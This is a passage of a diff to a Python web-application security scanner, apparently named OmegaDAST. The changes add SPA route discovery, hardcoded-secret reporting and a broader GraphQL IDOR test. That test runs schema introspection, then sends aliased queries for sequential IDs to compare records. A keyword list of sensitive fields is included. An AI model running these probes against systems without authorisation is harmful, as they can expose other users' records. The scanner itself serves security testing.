         self.https_oob_lock = threading.Lock()
         self.icmp_oob_lock = threading.Lock()
         
-        # Set global reference for OOB handlers
-        global _oob_scanner_instance
-        _oob_scanner_instance = self
+        # Set thread-local reference for OOB handlers to prevent race conditions
+        _oob_scanner_local.instance = self
         
         # Taint tracking initialization - DISABLED DUE TO RECURSION ERROR
         self.taint_tracking_enabled = False  # config.get('taint_tracking_enabled', True)
@@ -24523,6 +28398,19 @@ class OmegaDAST:
         self.log(f"GraphQL depth limit: {self.graphql_depth_limit}")
         self.log(f"GraphQL batch limit: {self.graphql_batch_limit}")
         self.log(f"gRPC fuzzing intensity: {self.grpc_fuzzing_intensity}")
+        
+        # Initialize enhanced SPA route discovery and FSM components
+        print("Initializing enhanced SPA route discovery and FSM components...")
+        try:
+            self.business_logic_fsm = BusinessLogicFSM()
+            self.spa_route_discovery_enabled = config.get('spa_route_discovery_enabled', True)
+            self.fsm_aware_testing_enabled = config.get('fsm_aware_testing_enabled', True)
+            self.log("Enhanced SPA route discovery and FSM components initialized")
+        except Exception as e:
+            logging.error(f"Failed to initialize enhanced SPA components: {e}")
+            self.business_logic_fsm = None
+            self.spa_route_discovery_enabled = False
+            self.fsm_aware_testing_enabled = False
         
         # Setup logging - only configure if not already configured
         if not logging.getLogger().handlers:
@@ -24620,9 +28508,12 @@ class OmegaDAST:
             self.vulnerability_timestamps[vuln_key] = time.time()
         if self.validation_enabled and self.validation_engine:
             try:
-                task = asyncio.create_task(self._validate_vulnerability(vuln))
+                task = await async_task_manager.create_task(
+                    self._validate_vulnerability(vuln),
+                    task_name=f"validate_{vuln['type']}_{vuln.get('url','')[:30]}",
+                    callback=lambda t: self.log(f"Validation completed for {vuln['type']}")
+                )
                 self.validation_tasks.add(task)
-                task.add_done_callback(self.validation_tasks.discard)
                 vuln['validation_pending'] = True
                 self.log(f"[VALIDATING] {vuln['type']} ({vuln.get('confidence')}%): {vuln['url']} [{vuln.get('parameter','')}]")
             except Exception as e:
@@ -24642,8 +28533,10 @@ class OmegaDAST:
         self.log(f"[+] {vuln['type']} ({vuln.get('confidence')}%): {vuln['url']} [{vuln.get('parameter','')}]")
         self.add_finding(vuln)
         if vuln.get('severity') in ('Critical','High'):
-            asyncio.ensure_future(self.send_slack_alert(vuln))
-            asyncio.ensure_future(self.send_jira_alert(vuln))
+            slack_task = asyncio.ensure_future(self.send_slack_alert(vuln))
+            slack_task.add_done_callback(lambda t: logging.error(f"Slack alert failed: {t.exception()}") if t.exception() else None)
+            jira_task = asyncio.ensure_future(self.send_jira_alert(vuln))
+            jira_task.add_done_callback(lambda t: logging.error(f"JIRA alert failed: {t.exception()}") if t.exception() else None)
     
     async def send_jira_alert(self, vuln):
         jira_url = self.config.get('jira_webhook')
@@ -24690,6 +28583,8 @@ class OmegaDAST:
             
             validation_status = validated_vuln.get('validation_results', {}).get('validation_status', 'unknown')
             final_confidence = validated_vuln.get('confidence', vuln.get('confidence', 0))
+            
+            # Update existing vulnerability entry with validation results
             for v in self.reporting_engine.vulnerabilities:
                 if (v['type'] == vuln['type'] and
                     v['url'] == vuln['url'] and
@@ -24697,14 +28592,16 @@ class OmegaDAST:
                     v.update(validated_vuln)
                     v['validation_pending'] = False
                     break
+            
             self.log(f"[VALIDATION COMPLETE] {vuln['type']} - Status: {validation_status}, Final Confidence: {final_confidence}%")
-            if validation_status == 'false_positive':
+            
+            # Only push verified findings to GUI and export if validation succeeded
+            if validation_status in ['confirmed', 'verified_by_proximity', 'likely']:
+                self.add_finding(validated_vuln)
+            elif validation_status == 'false_positive':
                 self.log(f"[FALSE POSITIVE DETECTED] {vuln['type']} at {vuln['url']} - marked for review")
-            elif validation_status == 'verified_by_proximity':
-                self.log(f"[PROXIMITY VALIDATION] {vuln['type']} at {vuln['url']} - auto-validated by signature")
             elif validation_status == 'skipped_circuit_breaker':
                 self.log(f"[CIRCUIT BREAKER] {vuln['type']} at {vuln['url']} - skipped due to rate limiting")
-            self.add_finding(validated_vuln)
         except Exception as e:
             logging.error(f"Vulnerability validation error: {e}")
             vuln['validation_error'] = str(e)
@@ -24725,16 +28622,18 @@ class OmegaDAST:
     def add_finding(self, vuln):
         # Ensure finding is added to reporting engine for both GUI and export
         if hasattr(self, 'reporting_engine'):
-            # Check if this vulnerability is already in the list to avoid duplicates
+            # Check if this vulnerability is already in the list to update it instead of duplicating
             vuln_key = (vuln.get('type', ''), vuln.get('url', ''), vuln.get('parameter', ''))
-            already_exists = any(
-                v.get('type', '') == vuln_key[0] and 
-                v.get('url', '') == vuln_key[1] and 
-                v.get('parameter', '') == vuln_key[2]
-                for v in self.reporting_engine.vulnerabilities
-            )
+            updated = False
+            for v in self.reporting_engine.vulnerabilities:
+                if (v.get('type', '') == vuln_key[0] and 
+                    v.get('url', '') == vuln_key[1] and 
+                    v.get('parameter', '') == vuln_key[2]):
+                    v.update(vuln)
+                    updated = True
+                    break
             
-            if not already_exists:
+            if not updated:
                 self.reporting_engine.vulnerabilities.append(vuln)
         
         # Emit signal for GUI display
@@ -24754,6 +28653,16 @@ class OmegaDAST:
         # Taint tracking removed due to RecursionError issues and lack of utility
         self.taint_tracking_enabled = False
         self.taint_integrated_session = None
+        
+        # Auto-resume from most recent checkpoint if enabled
+        auto_resume = self.config.get('auto_resume', SAFETY_CONFIG.get('auto_resume', False))
+        if auto_resume:
+            recent_checkpoint = self.scan_state_manager.find_most_recent_checkpoint()
+            if recent_checkpoint:
+                checkpoint_data = self.scan_state_manager.load_checkpoint_file(recent_checkpoint)
+                if checkpoint_data and checkpoint_data.get('target') == self.target:
+                    self.config['checkpoint_data'] = checkpoint_data
+                    self.log(f"Auto-resume: Loaded checkpoint from {recent_checkpoint}")
         
         if self.config.get('resume_scan'):
             prev_state = self.scan_state_manager.load_state()
@@ -24775,7 +28684,7 @@ class OmegaDAST:
             
             # Initialize Surgical Mode Orchestrator if intelligent verification is enabled
             if self.config.get('intelligent_verification', {}).get('enabled', False):
-                self.surgical_orchestrator = SurgicalModeOrchestrator(self.validation_engine, self.config)
+                self.surgical_orchestrator = SurgicalModeOrchestrator(self.validation_engine, self.config, self)
                 self.log("Surgical Mode Orchestrator initialized for intelligent verification pipeline")
             else:
                 self.surgical_orchestrator = None
@@ -24799,8 +28708,7 @@ class OmegaDAST:
             # Extract JavaScript content for analysis
             js_content = ''
             try:
-                from bs4 import BeautifulSoup
-                soup = BeautifulSoup(html_content, 'html.parser')
+                soup = get_cached_soup(html_content, 'html.parser')
                 scripts = soup.find_all('script')
                 for script in scripts:
                     if script.string:
@@ -24875,17 +28783,32 @@ class OmegaDAST:
             traceback.print_exc()
             self.targeted_payloads = {}
         if self.config.get('js_render', True):
+            # Use context manager for guaranteed cleanup
             self.selenium_driver = JSRenderDriver(
                 proxy=self.config.get('proxy'),
                 proxy_pool=self.session_manager.proxy_pool if hasattr(self.session_manager, 'proxy_pool') else None,
                 human_like_behavior=self.config.get('human_like_behavior', True)
             )
-            if not self.selenium_driver.create():
+            # Use context manager to ensure proper cleanup
+            self.selenium_driver.__enter__()
+            if not self.selenium_driver.driver:
                 self.log("JS rendering unavailable.")
+                self.selenium_driver.__exit__(None, None, None)
+                self.selenium_driver = None
             else:
                 self.selenium_ready = True
                 self.injection_engine.selenium_driver = self.selenium_driver
                 self.injection_engine.selenium_ready = True
+                
+                # Enable enhanced SPA route discovery if configured
+                if self.spa_route_discovery_enabled and self.selenium_driver.passive_route_monitoring:
+                    self.log("Enhanced SPA route discovery enabled via CDP")
+                    try:
+                        # Get initial discovered routes
+                        initial_routes = self.selenium_driver.get_discovered_routes()
+                        self.log(f"Initial framework detection: {initial_routes.get('framework_info', {})}")
+                    except Exception as e:
+                        logging.warning(f"Failed to get initial SPA routes: {e}")
         if self.config.get('auth_steps'):
             await self.session_manager.perform_authentication(self.config.get('auth_steps'))
         if self.config.get('cookies'):
@@ -24896,10 +28819,13 @@ class OmegaDAST:
         # Log safety configuration at start of scan
         maturity_level = self.config.get('maturity_level', 3)
         dry_run = self.config.get('dry_run', False)
+        auto_resume = self.config.get('auto_resume', False)
         self.log(f"[SAFETY] Scan started with Maturity Level {maturity_level}: {get_maturity_level_name(maturity_level)}")
         if dry_run:
             self.log("[SAFETY] DRY-RUN MODE: No payloads will be sent to target")
-        else:
+        if auto_resume:
+            self.log("[SAFETY] AUTO-RESUME MODE: Will automatically resume from most recent checkpoint")
+        if not dry_run:
             self.log("[SAFETY] LIVE MODE: Payloads will be sent according to maturity level restrictions")
         
         await self.setup()
@@ -25168,8 +29094,40 @@ class OmegaDAST:
             self.log("Scan state saved for resumption.")
         await self.finalize()
         await self.session_manager.close()
+        
+        # Report discovered secrets before cleanup
+        if self.selenium_driver and hasattr(self.selenium_driver, 'get_discovered_secrets'):
+            discovered_secrets = self.selenium_driver.get_discovered_secrets()
+            if discovered_secrets:
+                self.log(f"[SECRETS] Found {len(discovered_secrets)} hardcoded secrets during crawling")
+                secret_summary = self.selenium_driver.get_secret_summary()
+                self.log(f"[SECRETS] Summary: {secret_summary}")
+                
+                # Add secrets as findings to the report
+                for secret in discovered_secrets:
+                    secret_finding = {
+                        'type': 'Hardcoded Secret',
+                        'severity': secret['severity'],
+                        'url': secret.get('url', 'unknown'),
+                        'confidence': 95,  # High confidence for regex matches
+                        'evidence': f"Secret type: {secret['secret_type']}, Masked value: {secret['secret_value']}",
+                        'parameter': 'response_body',
+                        'cwe': 'CWE-798',  # Use of Hard-coded Credentials
+                        'full_evidence': {
+                            'secret_type': secret['secret_type'],
+                            'masked_value': secret['secret_value'],
+                            'context': secret.get('context', ''),
+                            'position': secret.get('position'),
+                            'timestamp': secret.get('timestamp')
+                        }
+                    }
+                    self.reporting_engine.vulnerabilities.append(secret_finding)
+                    self.add_finding(secret_finding)
+        
         if self.selenium_driver:
-            self.selenium_driver.quit()
+            # Use context manager exit for guaranteed cleanup
+            self.selenium_driver.__exit__(None, None, None)
+            self.selenium_driver = None
     async def finalize(self):
         self.log("Finalizing scan...")
         
@@ -25180,6 +29138,26 @@ class OmegaDAST:
         # Close injection engine to ensure proper cleanup
         if hasattr(self.injection_engine, 'close'):
             await self.injection_engine.close()
+        
+        # Close baseline cache to prevent resource leaks
+        if hasattr(self, 'baseline_cache') and hasattr(self.baseline_cache, 'close'):
+            self.baseline_cache.close()
+        
+        # Close scan state manager to prevent resource leaks
+        if hasattr(self, 'scan_state_manager') and hasattr(self.scan_state_manager, 'close'):
+            self.scan_state_manager.close()
+        
+        # Close crawler engine to prevent resource leaks
+        if hasattr(self, 'crawler_engine') and hasattr(self.crawler_engine, 'close'):
+            self.crawler_engine.close()
+        
+        # Close subdomain discovery to prevent resource leaks
+        if hasattr(self, 'subdomain_discovery') and hasattr(self.subdomain_discovery, 'close'):
+            self.subdomain_discovery.close()
+        
+        # Close version detection engine to prevent resource leaks
+        if hasattr(self, 'version_detection') and hasattr(self.version_detection, 'close'):
+            self.version_detection.close()
         
         self.oob_manager.stop()
         await self.reporting_engine.close()
@@ -25233,7 +29211,7 @@ class OmegaDAST:
             
             if resp and resp.status == 200:
                 html = resp._body
-                soup = BeautifulSoup(html, 'html.parser')
+                soup = get_cached_soup(html, 'html.parser')
                 page_metadata = {
                     'url': url,
                     'hash': hashlib.md5(html.encode()).hexdigest(),
@@ -25242,6 +29220,24 @@ class OmegaDAST:
                 }
                 self.crawler_engine.crawled_pages.append(page_metadata)
                 await self.loop.run_in_executor(None, self.scan_state_manager.store_page_hash, url, html, page_metadata)
+                
+                # Learn business logic state from URL if FSM is available
+                if self.business_logic_fsm:
+                    try:
+                        current_state = self.business_logic_fsm.detect_state_from_url(url)
+                        # Analyze forms for state transitions
+                        for form in soup.find_all('form'):
+                            form_text = form.get_text().lower()
+                            action = urljoin(url, form.get('action', ''))
+                            if any(kw in form_text for kw in ['add', 'cart', 'buy', 'checkout', 'payment']):
+                                next_state = self.business_logic_fsm.detect_state_from_url(action)
+                                self.business_logic_fsm.add_transition(current_state, next_state, 'form_submission', {
+                                    'url': url,
+                                    'action': action,
+                                    'form_text': form_text[:100]  # Truncate for logging
+                                })
+                    except Exception as e:
+                        logging.debug(f"FSM learning error during crawl: {e}")
                 
                 # Update endpoint progress to completed
                 if hasattr(self.signals, 'endpoint_progress'):
@@ -25268,14 +29264,39 @@ class OmegaDAST:
                         v = Detector.dom_xss(None, self.selenium_driver, '', '')
                         if v: await self._add_vulnerability(v)
                     await self._process_cdp_responses(queue, depth)
-                    rendered_soup = BeautifulSoup(rendered, 'html.parser')
+                    rendered_soup = get_cached_soup(rendered, 'html.parser')
                     js_links = self.crawler_engine._extract_links(rendered_soup, url, rendered)
                     for l in js_links:
                         if l not in self.crawler_engine.visited_urls:
                             await queue.put((l, depth + 1))
                     self.crawler_engine._extract_parameters(url, rendered, rendered_soup)
                     if self.config.get('spa_crawling', True):
+                        # Enhanced SPA route discovery with framework instrumentation
                         spa_routes = await self.loop.run_in_executor(None, self.selenium_driver.click_spa_routes, url)
+                        
+                        # Get additional routes from framework instrumentation if available
+                        if self.spa_route_discovery_enabled and self.selenium_driver.passive_route_monitoring:
+                            try:
+                                discovered_routes_data = self.selenium_driver.get_discovered_routes()
+                                framework_routes = discovered_routes_data.get('discovered_routes', [])
+                                if framework_routes:
+                                    self.log(f"Discovered {len(framework_routes)} framework-instrumented routes")
+                                    for route_info in framework_routes:
+                                        if isinstance(route_info, dict):
+                                            route_path = route_info.get('path')
+                                            if route_path:
+                                                # Convert relative path to absolute URL
+                                                if route_path.startswith('/'):
+                                                    spa_url = f"{urlparse(url).scheme}://{urlparse(url).netloc}{route_path}"
+                                                else:
+                                                    spa_url = route_path
+                                                
+                                                if spa_url not in self.crawler_engine.visited_urls:
+                                                    await queue.put((spa_url, depth + 1))
+                            except Exception as e:
+                                logging.debug(f"Framework route discovery error: {e}")
+                        
+                        # Add traditional SPA routes
                         for spa_url in spa_routes:
                             if spa_url not in self.crawler_engine.visited_urls:
                                 await queue.put((spa_url, depth + 1))
@@ -27798,58 +31819,310 @@ class OmegaDAST:
                 logging.debug(f"Failed to parse __typename validation response: {e}")
                 return
             
-            # Step 2: Sequentially test with different IDs using aliases
-            # Test pattern: { a1: user(id:1), a2: user(id:2) }
+            # Step 2: Discover available query fields dynamically instead of hardcoded "user"
+            # Try introspection first to get available queries
+            discovered_queries = []
+            try:
+                introspection_query = '{ __schema { queryType { fields { name args { name type { name } } } } } }'
+                intro_resp = await self._async_fetch(endpoint, method='POST', json_data={'query': introspection_query})
+                if intro_resp and intro_resp.status == 200:
+                    intro_data = intro_resp.json() if hasattr(intro_resp, 'json') else {}
+                    if 'data' in intro_data and '__schema' in intro_data['data']:
+                        query_fields = intro_data['data']['__schema']['queryType']['fields']
+                        # Filter for queries that take an ID argument
+                        for field in query_fields:
+                            field_name = field['name']
+                            args = field.get('args', [])
+                            # Check if this field has an ID-like argument
+                            id_arg = None
+                            for arg in args:
+                                arg_name = arg['name'].lower()
+                                if 'id' in arg_name or 'uuid' in arg_name or 'key' in arg_name:
+                                    id_arg = arg['name']
+                                    break
+                            if id_arg:
+                                discovered_queries.append((field_name, id_arg))
+            except Exception as e:
+                logging.debug(f"Introspection failed, falling back to common query names: {e}")
+            
+            # Fallback to common query names if introspection failed or returned nothing
+            if not discovered_queries:
+                common_queries = [
+                    ('user', 'id'), ('users', 'id'), ('getUser', 'id'), ('User', 'id'),
+                    ('product', 'id'), ('products', 'id'), ('getProduct', 'id'), ('Product', 'id'),
+                    ('account', 'id'), ('accounts', 'id'), ('getAccount', 'id'), ('Account', 'id'),
+                    ('order', 'id'), ('orders', 'id'), ('getOrder', 'id'), ('Order', 'id'),
+                    ('post', 'id'), ('posts', 'id'), ('getPost', 'id'), ('Post', 'id'),
+                    ('item', 'id'), ('items', 'id'), ('getItem', 'id'), ('Item', 'id')
+                ]
+                discovered_queries = common_queries
+            
+            # Step 3: Sequentially test with different IDs using aliases for each discovered query
+            # Test pattern: { a1: query(id:1), a2: query(id:2) }
             id_pairs = [(1, 2), (1, 3), (2, 3), (1, 4), (5, 6)]
             
-            for id1, id2 in id_pairs:
-                idor_query = f'{{ a1: user(id: "{id1}") {{ id name email }}, a2: user(id: "{id2}") {{ id name email }} }}'
-                
-                resp = await self._async_fetch(endpoint, method='POST', json_data={'query': idor_query})
-                
-                if resp and resp.status == 200:
-                    try:
-                        response_data = resp.json() if hasattr(resp, 'json') else {}
-                        
-                        if 'data' in response_data:
-                            a1_data = response_data['data'].get('a1')
-                            a2_data = response_data['data'].get('a2')
-                            
-                            # Check if a1 and a2 return different data
-                            if a1_data and a2_data:
-                                # Compare the data structures
-                                if a1_data != a2_data:
-                                    # This indicates different users are accessible - potential IDOR
-                                    await self._add_vulnerability({
-                                        "type":"GraphQL Batching IDOR",
-                                        "url":endpoint,
-                                        "parameter":"query",
-                                        "evidence":f"Alias brute-force revealed different data for user(id:{id1}) vs user(id:{id2}) - confirmed IDOR (false negative eliminated)",
-                                        "severity":"High",
-                                        "confidence":90,
-                                        "cwe":CWE_MAP["IDOR"]
-                                    })
-                                    logging.info(f"GraphQL IDOR confirmed via alias brute-force at {endpoint}")
-                                    return  # Confirmed IDOR, no need to continue
-                                else:
-                                    # Same data returned - might be same user or templated response
-                                    logging.debug(f"Same data returned for user(id:{id1}) and user(id:{id2})")
-                            elif a1_data and not a2_data:
-                                # One ID works, other doesn't - could be access control or non-existent user
-                                logging.debug(f"user(id:{id1}) returned data but user(id:{id2}) did not")
-                            elif not a1_data and a2_data:
-                                # One ID works, other doesn't
-                                logging.debug(f"user(id:{id2}) returned data but user(id:{id1}) did not")
+            for query_name, id_arg in discovered_queries:
+                for id1, id2 in id_pairs:
+                    # Build dynamic query based on discovered field and argument name
+                    idor_query = f'{{ a1: {query_name}({id_arg}: "{id1}") {{ id name email }}, a2: {query_name}({id_arg}: "{id2}") {{ id name email }} }}'
                     
-                    except Exception as e:
-                        logging.debug(f"Failed to parse IDOR test response: {e}")
-                        continue
+                    resp = await self._async_fetch(endpoint, method='POST', json_data={'query': idor_query})
+                    
+                    if resp and resp.status == 200:
+                        try:
+                            response_data = resp.json() if hasattr(resp, 'json') else {}
+                            
+                            if 'data' in response_data:
+                                a1_data = response_data['data'].get('a1')
+                                a2_data = response_data['data'].get('a2')
+                                
+                                # Check if a1 and a2 return different data using enhanced analysis
+                                if a1_data and a2_data:
+                                    # Perform deep analysis for IDOR detection
+                                    idor_detected = self._analyze_graphql_idor_response(a1_data, a2_data, query_name, id_arg, id1, id2)
+                                    
+                                    if idor_detected['is_idor']:
+                                        # This indicates different resources are accessible - potential IDOR
+                                        await self._add_vulnerability({
+                                            "type":"GraphQL Batching IDOR",
+                                            "url":endpoint,
+                                            "parameter":"query",
+                                            "evidence":idor_detected['evidence'],
+                                            "severity":"High",
+                                            "confidence":idor_detected['confidence'],
+                                            "cwe":CWE_MAP["IDOR"]
+                                        })
+                                        logging.info(f"GraphQL IDOR confirmed via alias brute-force at {endpoint} for query {query_name}")
+                                        return  # Confirmed IDOR, no need to continue
+                                    else:
+                                        # Same data returned - might be same resource or templated response
+                                        logging.debug(f"Analysis result: {idor_detected['reason']} for {query_name}({id_arg}:{id1}) and {query_name}({id_arg}:{id2})")
+                                elif a1_data and not a2_data:
+                                    # One ID works, other doesn't - could be access control or non-existent resource
+                                    # This might still indicate IDOR if we can access one resource but not another
+                                    logging.debug(f"{query_name}({id_arg}:{id1}) returned data but {query_name}({id_arg}:{id2}) did not - potential access control issue")
+                                elif not a1_data and a2_data:
+                                    # One ID works, other doesn't
+                                    logging.debug(f"{query_name}({id_arg}:{id2}) returned data but {query_name}({id_arg}:{id1}) did not - potential access control issue")
+                        
+                        except Exception as e:
+                            logging.debug(f"Failed to parse IDOR test response: {e}")
+                            continue
             
             # If we get here without finding IDOR, log the completion
             logging.debug(f"GraphQL alias brute-force completed at {endpoint} - no IDOR detected")
             
         except Exception as e:
             logging.warning(f"GraphQL batching IDOR test error at {endpoint}: {e}")
+    
+    def _analyze_graphql_idor_response(self, a1_data: dict, a2_data: dict, query_name: str, id_arg: str, id1: int, id2: int) -> dict:
+        """
+        Perform deep analysis of GraphQL responses to detect IDOR beyond simple equality.
+        
+        Args:
+            a1_data: Response data for first ID
+            a2_data: Response data for second ID
+            query_name: Name of the GraphQL query being tested
+            id_arg: Name of the ID argument
+            id1: First ID value
+            id2: Second ID value
+            
+        Returns:
+            dict: {
+                'is_idor': bool,
+                'confidence': int,
+                'evidence': str,
+                'reason': str
+            }
+        """
+        result = {
+            'is_idor': False,
+            'confidence': 0,
+            'evidence': '',
+            'reason': ''
+        }
+        
+        # Level 1: Direct structural inequality
+        if a1_data != a2_data:
+            # Check if the difference is in identifiable fields
+            diff_details = self._get_meaningful_differences(a1_data, a2_data)
+            
+            if diff_details['has_meaningful_diff']:
+                result['is_idor'] = True
+                result['confidence'] = 90
+                result['evidence'] = f"Alias brute-force revealed different data for {query_name}({id_arg}:{id1}) vs {query_name}({id_arg}:{id2}) - {diff_details['details']}"
+                result['reason'] = "Meaningful differences detected in response data"
+                return result
+            else:
+                result['reason'] = "Structural difference but no meaningful field differences (likely templated response)"
+        
+        # Level 2: Check for ID field reflection
+        id1_reflected = self._check_id_reflection(a1_data, id1)
+        id2_reflected = self._check_id_reflection(a2_data, id2)
+        
+        if id1_reflected and id2_reflected:
+            # Both IDs are reflected - if data is identical, might be same resource mapping
+            result['reason'] = f"Both IDs {id1} and {id2} reflected but data identical - possible ID mapping to same object"
+        elif id1_reflected or id2_reflected:
+            # Only one ID reflected - could indicate inconsistent behavior
+            result['reason'] = f"Inconsistent ID reflection - ID {id1 if id1_reflected else id2} reflected but other not"
+        
+        # Level 3: Check for sensitive field exposure
+        sensitive_fields = self._extract_sensitive_fields(a1_data)
+        if sensitive_fields:
+            # Even if data is same, exposure of sensitive fields with different IDs is concerning
+            result['is_idor'] = True
+            result['confidence'] = 75
+            result['evidence'] = f"Sensitive fields {sensitive_fields} accessible via {query_name}({id_arg}:{id1}) and {query_name}({id_arg}:{id2}) - potential IDOR with same object mapping"
+            result['reason'] = "Sensitive fields accessible even with identical responses"
+            return result
+        
+        # Level 4: Temporal analysis - check timestamps or sequential data
+        temporal_diff = self._check_temporal_differences(a1_data, a2_data)
+        if temporal_diff['has_temporal_diff']:
+            result['is_idor'] = True
+            result['confidence'] = 85
+            result['evidence'] = f"Temporal differences detected: {temporal_diff['details']} for {query_name}({id_arg}:{id1}) vs {query_name}({id_arg}:{id2})"
+            result['reason'] = "Temporal inconsistencies suggest different resource access"
+            return result
+        
+        # Level 5: Partial data access - check if one response has more data than other
+        a1_field_count = self._count_nested_fields(a1_data)
+        a2_field_count = self._count_nested_fields(a2_data)
+        
+        if a1_field_count != a2_field_count:
+            result['is_idor'] = True
+            result['confidence'] = 70
+            result['evidence'] = f"Different field counts ({a1_field_count} vs {a2_field_count}) for {query_name}({id_arg}:{id1}) vs {query_name}({id_arg}:{id2}) - potential partial data access IDOR"
+            result['reason'] = "Field count differences suggest access control bypass"
+            return result
+        
+        result['reason'] = "No meaningful IDOR indicators detected - responses appear legitimate"
+        return result
+    
+    def _get_meaningful_differences(self, data1: dict, data2: dict) -> dict:
+        """Extract meaningful differences between two data structures."""
+        result = {
+            'has_meaningful_diff': False,
+            'details': ''
+        }
+        
+        # Check for differences in key identifying fields
+        identifying_fields = ['id', 'uuid', 'email', 'username', 'name', 'slug', 'key']
+        diff_list = []
+        
+        for field in identifying_fields:
+            val1 = self._get_nested_value(data1, field)
+            val2 = self._get_nested_value(data2, field)
+            
+            if val1 != val2:
+                diff_list.append(f"{field}: {val1} vs {val2}")
+                result['has_meaningful_diff'] = True
+        
+        if result['has_meaningful_diff']:
+            result['details'] = ', '.join(diff_list)
+        
+        return result
+    
+    def _check_id_reflection(self, data: dict, expected_id: int) -> bool:
+        """Check if the expected ID is reflected in the response."""
+        # Check common ID field names
+        id_fields = ['id', 'userId', 'user_id', 'uuid', 'key']
+        
+        for field in id_fields:
+            value = self._get_nested_value(data, field)
+            if value and str(value) == str(expected_id):
+                return True
+        
+        return False
+    
+    def _extract_sensitive_fields(self, data: dict) -> list:
+        """Extract sensitive field names from response data."""
+        sensitive_patterns = [
+            'password', 'token', 'secret', 'key', 'credit', 'ssn', 'social',
+            'phone', 'address', 'email', 'api_key', 'auth', 'session'
+        ]
+        
+        found_fields = []
+        self._extract_sensitive_fields_recursive(data, '', sensitive_patterns, found_fields)
+        
+        return found_fields
+    
+    def _extract_sensitive_fields_recursive(self, data: dict, path: str, patterns: list, found: list):
+        """Recursively search for sensitive fields."""
+        if isinstance(data, dict):
+            for key, value in data.items():
+                current_path = f"{path}.{key}" if path else key
+                key_lower = key.lower()
+                
+                for pattern in patterns:
+                    if pattern in key_lower:
+                        found.append(current_path)
+                        break
+                
+                self._extract_sensitive_fields_recursive(value, current_path, patterns, found)
+        elif isinstance(data, list):
+            for i, item in enumerate(data):
+                current_path = f"{path}[{i}]" if path else f"[{i}]"
+                self._extract_sensitive_fields_recursive(item, current_path, patterns, found)
+    
+    def _check_temporal_differences(self, data1: dict, data2: dict) -> dict:
+        """Check for temporal differences (timestamps, dates, etc.)."""
+        result = {
+            'has_temporal_diff': False,
+            'details': ''
+        }
+        
+        temporal_fields = ['created_at', 'updated_at', 'timestamp', 'date', 'time', 'last_modified']
+        diff_list = []
+        
+        for field in temporal_fields:
+            val1 = self._get_nested_value(data1, field)
+            val2 = self._get_nested_value(data2, field)
+            
+            if val1 != val2:
+                diff_list.append(f"{field}: {val1} vs {val2}")
+                result['has_temporal_diff'] = True
+        
+        if result['has_temporal_diff']:
+            result['details'] = ', '.join(diff_list)
+        
+        return result
+    
+    def _count_nested_fields(self, data: dict) -> int:
+        """Count total number of fields in nested structure."""
+        count = 0
+        
+        if isinstance(data, dict):
+            for value in data.values():
+                count += 1
+                count += self._count_nested_fields(value)
+        elif isinstance(data, list):
+            for item in data:
+                count += self._count_nested_fields(item)
+        
+        return count
+    
+    def _get_nested_value(self, data: dict, field: str) -> any:
+        """Get value from nested dict by field name (searches all levels)."""
+        if isinstance(data, dict):
+            # Check direct key
+            if field in data:
+                return data[field]
+            
+            # Search nested structures
+            for value in data.values():
+                result = self._get_nested_value(value, field)
+                if result is not None:
+                    return result
+        
+        elif isinstance(data, list):
+            for item in data:
+                result = self._get_nested_value(item, field)
+                if result is not None:
+                    return result
+        
+        return None
     
     def dns_bruteforce(self, domain, wordlist=None):
         if not DNS_AVAILABLE:
@@ -27873,7 +32146,7 @@ class OmegaDAST:
         try:
             resp = await self.session_manager.fetch(
                 url, method=method, data=data, json_data=json_data,
-                headers=headers, allow_redirects=False, use_cache=use_cache,
+                headers=headers, allow_redirects=True, use_cache=use_cache,
                 session_manager=session_manager, session_id=session_id, cookies=cookies
             )
             if resp:
@@ -27882,8 +32155,11 @@ class OmegaDAST:
                 resp._elapsed = getattr(resp, '_elapsed', 0)
                 return resp
             return None
+        except (ConnectionError, asyncio.TimeoutError, aiohttp.ClientError) as e:
+            logging.debug(f"Network error during async fetch for {url}: {e}")
+            return None
         except Exception as e:
-            logging.debug(f"Async fetch error for {url}: {e}")
+            logging.debug(f"Unexpected error during async fetch for {url}: {e}", exc_info=True)
             return None
 
     async def test_jwts(self):
@@ -28495,43 +32771,47 @@ class GraphQLSelfReferencingFragmentGenerator:
                 source = Source(query)
                 document = parse(source)
                 
-                def calculate_depth(node, current_depth=0):
-                    """Recursively calculate depth of GraphQL AST nodes."""
+                def calculate_depth(node):
+                    """Iteratively calculate depth of GraphQL AST nodes using a stack."""
                     if not node:
-                        return current_depth
+                        return 0
                     
-                    max_child_depth = current_depth
+                    max_depth = 0
+                    stack = [(node, 0)]
                     
-                    if hasattr(node, 'selection_set') and node.selection_set:
-                        for selection in node.selection_set.selections:
-                            if isinstance(selection, FieldNode):
-                                child_depth = calculate_depth(selection, current_depth + 1)
-                                max_child_depth = max(max_child_depth, child_depth)
+                    while stack:
+                        current_node, current_depth = stack.pop()
+                        max_depth = max(max_depth, current_depth)
+                        
+                        if current_depth > 100:  # Prevent excessive processing
+                            continue
+                        
+                        if hasattr(current_node, 'selection_set') and current_node.selection_set:
+                            for selection in current_node.selection_set.selections:
+                                if isinstance(selection, FieldNode):
+                                    stack.append((selection, current_depth + 1))
                     
-                    return max_child_depth
+                    return max_depth
                 
                 # Calculate depth for each top-level operation
                 max_depth = 0
                 for definition in document.definitions:
                     if hasattr(definition, 'selection_set') and definition.selection_set:
-                        depth = calculate_depth(definition, 0)
+                        depth = calculate_depth(definition)
                         max_depth = max(max_depth, depth)
                 
                 return max_depth
                 
             except ImportError:
                 # Fallback to regex-based depth analysis if graphql-core not available
-                return self._analyze_graphql_nesting_depth_fallback(query, depth=0)
+                return self._analyze_graphql_nesting_depth_fallback(query)
                 
         except Exception as e:
             logging.error(f"Error analyzing GraphQL nesting depth: {e}")
-            return self._analyze_graphql_nesting_depth_fallback(query, depth=0)
+            return self._analyze_graphql_nesting_depth_fallback(query)
     
-    def _analyze_graphql_nesting_depth_fallback(self, query, depth=0):
-        """Fallback regex-based GraphQL nesting depth analysis."""
-        if depth > 10:  # Prevent infinite recursion
-            return 0
-            
+    def _analyze_graphql_nesting_depth_fallback(self, query):
+        """Fallback regex-based GraphQL nesting depth analysis (iterative)."""
         max_depth = 0
         current_depth = 0
         
@@ -28659,9 +32939,12 @@ class GraphQLSelfReferencingFragmentGenerator:
             self.vulnerability_timestamps[vuln_key] = time.time()
         if self.validation_enabled and self.validation_engine:
             try:
-                task = asyncio.create_task(self._validate_vulnerability(vuln))
+                task = await async_task_manager.create_task(
+                    self._validate_vulnerability(vuln),
+                    task_name=f"validate_{vuln['type']}_{vuln.get('url','')[:30]}",
